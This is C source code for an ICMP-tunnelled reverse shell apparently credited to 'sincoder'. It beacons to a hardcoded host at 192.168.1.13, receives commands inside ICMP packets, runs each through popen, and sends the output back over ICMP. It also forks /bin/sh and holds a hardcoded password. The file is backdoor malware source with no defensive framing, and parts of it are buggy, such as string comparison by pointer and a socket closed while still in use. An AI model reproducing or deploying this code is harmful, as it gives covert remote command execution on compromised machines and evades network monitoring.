
#include "icmp_shell.h"
#include "buffer.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/time.h>

typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;

#define dbg_msg(fmt,...) do{\
        printf(fmt,__VA_ARGS__); \
    }while(0);

//#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小
#define MAX_BUFF_SIZE  1000 // max data size can send 
#define SLEEP_TIME 1000
#define IN_BUF_SIZE 1024
#define OUT_BUF_SIZE 64
#define BUFFER2 1000

pthread_t MyCreateThread(void * (*func)(void *), void *lparam)
{
    pthread_attr_t attr;
    pthread_t  p;
    pthread_attr_init(&attr);
    //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    if (0 == pthread_create(&p, &attr, func, lparam))
    {
        pthread_attr_destroy(&attr);
        return p;
    }
    //dbg_msg("pthread_create() error: %s \n", strerror(errno));
    pthread_attr_destroy(&attr);
    return 0;
}

enum PACKET_TYPE
{
    TYPE_REQUEST = 0x2B,
    TYPE_REPLY
};


struct packet_header
{
    uint8 type;
};


int  g_icmp_sock = 0;
int  g_CanThreadExit = 0; //线程是不是可以退出了。
int  read_pipe[2];  //读取的管道
int  write_pipe[2];
char *g_MyName = NULL;
uint32 g_RemoteIp = 0;// 远程 ip
char *g_Cmd = NULL; //要执行的命令
char *g_Request = NULL;//请求的数据吧
char *g_password = "sincoder"; //通信的密码
int  g_child_pid = 0;// pid of sh
char *g_hello_msg = "Icmp Shell V1.0 \n\
By: sincoder \n\
command:\n\
\trestartshell\n";
uint32 g_bind_ip = 0;
//char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
pthread_mutex_t g_output_mutex;
buffer_context g_output_buffer = {0};



unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}


uint16  random16()
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (uint16)tv.tv_sec * tv.tv_usec;
}

int  icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)
{
    struct icmphdr *icmp;
    struct sockaddr_in addr;
    char in_buf[IN_BUF_SIZE];
    int nbytes;
    int ret = 1;

    //dbg_msg("%s: try send request to %s \n", __func__, iptos(ip));

    icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);
    if (NULL == icmp)
    {
        return -1;
    }
    icmp->type = 0;  // icmp  request
    icmp->code = 0;
    icmp->un.echo.id = random16();
    icmp->un.echo.sequence = random16();

    memcpy(icmp + 1, pdata, size);
    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;

    icmp->checksum = 0x00;
    icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);

    // send reply
    nbytes = sendto(icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
    if (nbytes == -1)
    {
        perror("sendto");
        ret = -1;
    }

    memset(in_buf, 0x00, IN_BUF_SIZE);
    nbytes = read(icmp_sock, in_buf, IN_BUF_SIZE - 1);

    free(icmp);
    return ret;
}

int hello(){
  return icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
}

void *receive_icmp_data(void *lparam){

  int sockfd;
  int flags;
  char in_buf[IN_BUF_SIZE];
  char out_buf[OUT_BUF_SIZE];
  unsigned int out_size;
  int nbytes;
  struct iphdr *ip;
  struct icmphdr *icmp;
  char *data;
  struct sockaddr_in addr;

// create raw ICMP socket
  sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    //return -1;
  }

// set stdin to non-blocking
  flags = fcntl(0, F_GETFL, 0);
  flags |= O_NONBLOCK;
  fcntl(0, F_SETFL, flags);


// read data from socket
  while(1){
    memset(in_buf, 0x00, IN_BUF_SIZE);
    nbytes = read(sockfd, in_buf, IN_BUF_SIZE - 1);
    if (nbytes > 0) {
    // get ip and icmp header and data part
      ip = (struct iphdr *) in_buf;
      if (nbytes > sizeof(struct iphdr)) {
        nbytes -= sizeof(struct iphdr);
        icmp = (struct icmphdr *) (ip + 1);
        if (nbytes > sizeof(struct icmphdr)) {
          nbytes -= sizeof(struct icmphdr);
          data = (char *) (icmp + 1);
          data[nbytes] = '\0';
          //printf("%s", data);
          fflush(stdout);
        }
        
          //printf("test");
          char pwd[100];
          char buffercd[50];
          char pwdbuff[100];
          sprintf(buffercd, "%c%c%c", data[0], data[1], data[2]);
          printf("Command: %s", data);
          //printf("cd: %s", buffercd);
          if (buffercd == "cd "){
            //printf("is equal\n");
            char path[200];
            strncpy(path,data+3,strlen(data)-3);
            chdir(path);
            sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
            icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
          }
          
          FILE *output;
          char buffer[BUFFER2]; 
          char commandoutput[BUFFER2];
          output = popen(data,"r");
          if (output == NULL){
            icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "Error executing popen", 21);
            //fputs("Error executing popen", stderr);
          }else{
            while(fgets(buffer,BUFFER2-1,output) != NULL){
              icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), buffer, sizeof(buffer));
              //strcpy(commandoutput, buffer);
            }
          }
          //fflush(stdout);
          //memset(data, 0x00, nbytes);
          //strcpy(data, commandoutput);
          //printf("Data: %s\n", data);
          
      }
      //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), commandoutput, sizeof(commandoutput));

		// reuse headers
		  //icmp->type = 0;
		  //addr.sin_family = AF_INET;
		  //addr.sin_addr.s_addr = ip->saddr;

		// read data from stdin
		  //nbytes = read(0, out_buf, OUT_BUF_SIZE);
		  //if (nbytes > -1) {
			  //memcpy((char *) (icmp + 1), out_buf, nbytes);
			  //out_size = nbytes;
		  //} else {
			  //out_size = 0;
		  //}

		  //icmp->checksum = 0x00;
		  //icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + out_size);

		// send reply
		  //nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + out_size, 0, (struct sockaddr *) &addr, sizeof(addr));
		  //if (nbytes == -1) {
			  //perror("sendto");
			 // return -1;
		 // }

}}}

int main(int argc, char **argv){
    int pid;
    g_MyName = argv[0]; //保存下
    //atexit(OnExit);
    // create raw ICMP socket
    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (g_icmp_sock == -1)
    {
        perror("socket");
        return -1;
    }

    //bind(g_icmp_sock,)
    //要 不用 Bind 一个本地的ip 只接收来自远程的 包

    pipe(read_pipe);
    pipe(write_pipe);

    g_child_pid = fork();

    if (0 == g_child_pid)
    {
        //进入子进程
        //启动 shell 进程
        close(g_icmp_sock); // child do not need
        close(read_pipe[0]);
        close(write_pipe[1]);
        char *argv[] = {"/bin/sh", NULL};
        char *shell = "/bin/sh";
        dup2(write_pipe[0], STDIN_FILENO); //将输入输出重定向到管道
        dup2(read_pipe[1], STDOUT_FILENO);
        dup2(read_pipe[1], STDERR_FILENO);
        execv(shell, argv); //启动 shell
    }
    else
    {
        //pthread_t hIcmpRecv;
        //pthread_t hShellRead;
        //close(read_pipe[1]);
        //close(write_pipe[0]);
        //buffer_init(&g_output_buffer);
        //dbg_msg("child process id %d \n", g_child_pid);
                //pthread_mutex_init(&g_output_mutex, NULL);
        //启动一个线程来读取
        //hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
        //hShellRead = MyCreateThread(ShellPipe_ReadThread, NULL);
        

        //if (0 == hIcmpRecv || 0 == hShellRead)
        //{
           // dbg_msg("%s:Create Thread exit ... \n", __func__);
        //}
        //waitpid(g_child_pid, NULL, 0); //等待子进程退出
        //dbg_msg("%s:child exit. ..\n", __func__);
        //write(g_icmp_soick,"sincoder",8);
        
        
        //printf("Sending hello\n");
        
        //hello();
        
        icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
        pthread_t hIcmpRecv;
        hIcmpRecv = MyCreateThread(receive_icmp_data, NULL);
        //receive_icmp_data();
        close(g_icmp_sock);
        pthread_join(hIcmpRecv, NULL);
        
        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
        //printf("HELLO SEND SUCESFULY\n");
        //printf("data received\n");
    ////icmp_sendrequest(g_icmp_sock, inet_addr("127.0.0.1"), "sincoder", 8);
        
          
        //close(g_icmp_sock); //tell the icmp_recv thread exit ...
        //close(read_pipe[0]);
        //close(write_pipe[1]);
        //dbg_msg("%s:wait thread exit ...\n", __func__);
        //pthread_join(hIcmpRecv, NULL); //线程会因为上面的句柄关闭 而退出
        //pthread_join(hShellRead, NULL);
        //buffer_free(&g_output_buffer);
    }
    return 0;
}
